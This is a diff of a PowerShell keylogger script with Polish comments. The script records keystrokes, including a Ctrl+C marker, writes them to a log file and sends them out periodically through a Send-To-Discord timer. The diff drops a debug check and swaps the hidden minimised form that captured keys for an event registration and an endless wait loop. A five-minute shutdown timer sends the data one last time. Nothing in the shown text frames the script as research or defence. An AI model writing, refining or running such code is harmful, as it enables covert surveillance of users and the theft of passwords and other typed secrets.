@@ -14,13 +14,6 @@ $global:loggedKeys = ""
 function Save-Log {
     try {
         Write-Host "Zapisuję logi do pliku: $logPath"
-        # Debugowanie, czy folder Documents istnieje
-        if (Test-Path "$env:USERPROFILE\Documents") {
-            Write-Host "Folder Documents istnieje."
-        } else {
-            Write-Host "Folder Documents NIE istnieje!"
-        }
-
         $global:loggedKeys | Out-File -Append -Encoding UTF8 -FilePath $logPath
         $global:loggedKeys = ""
     } catch {
@@ -60,11 +53,8 @@ $sendTimer.AutoReset = $true
 $sendTimer.add_Elapsed({ Send-To-Discord })
 $sendTimer.Start()
 
-# Formularz do rejestracji klawiszy
-$form = New-Object Windows.Forms.Form
-$form.WindowState = "Minimized"
-$form.ShowInTaskbar = $false
-$form.Add_KeyDown({
+# Rejestracja klawiszy
+Register-ObjectEvent -InputObject [System.Windows.Forms.Control]::new() -EventName KeyDown -Action {
     param($sender, $e)
     $key = $e.KeyCode.ToString()
     if ($e.Control -and $e.KeyCode -eq "C") { $key = "[Ctrl+C]" }
@@ -72,7 +62,7 @@ $form.Add_KeyDown({
     if ($global:loggedKeys.Length -gt 50) {
         Save-Log
     }
-})
+}
 
 # Główny timer zamykający skrypt po 5 minutach
 $shutdownTimer = New-Object System.Timers.Timer
@@ -83,12 +73,8 @@ $shutdownTimer.add_Elapsed({
     Send-To-Discord
     $sendTimer.Stop()
     $shutdownTimer.Stop()
-    $form.Close()
 })
 $shutdownTimer.Start()
 
-# Start ukrytego formularza
-$form.Add_Shown({ $form.Hide() })
-[void]$form.ShowDialog()
-
-
+# Czekaj na zdarzenia
+while ($true) { Start-Sleep -Seconds 1 }
